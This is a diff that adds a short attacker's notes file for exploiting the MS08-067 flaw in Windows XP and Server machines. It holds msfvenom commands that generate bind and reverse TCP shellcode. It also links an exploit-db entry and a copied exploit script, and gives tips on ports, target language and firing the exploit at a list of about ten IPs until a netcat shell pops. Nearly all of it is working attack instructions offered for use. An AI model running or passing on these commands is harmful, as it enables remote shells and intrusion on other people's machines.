@@ -1,0 +1,16 @@
+genpayload shellcode:
+#sometimes works# msfvenom -p windows/shell_bind_tcp RHOST=YOUR-LOCALHOST LPORT=5150 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
+#works best with winblows serv boxes# msfvenom -p windows/shell_reverse_tcp LHOST=YOUR-localhost LPORT=5150 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
+#works best with xp# msfvenom -p windows/shell_reverse_tcp LHOST=blork-mcgavin LPORT=5150 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
+
+#https://www.exploit-db.com/exploits/7132  -- needs work, but sometimes will fire payload
+#try 139 and 445 seperately, mainly 445 works though
+
+#emmycat-ms08-067.py stolen from https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py, thx :3
+#5/french works great for any type of xp box
+#wait a minute after the script runs through a small list (around 10 ips) to see if the shell pops, esp with nc because its slow
+
+
+
+
+
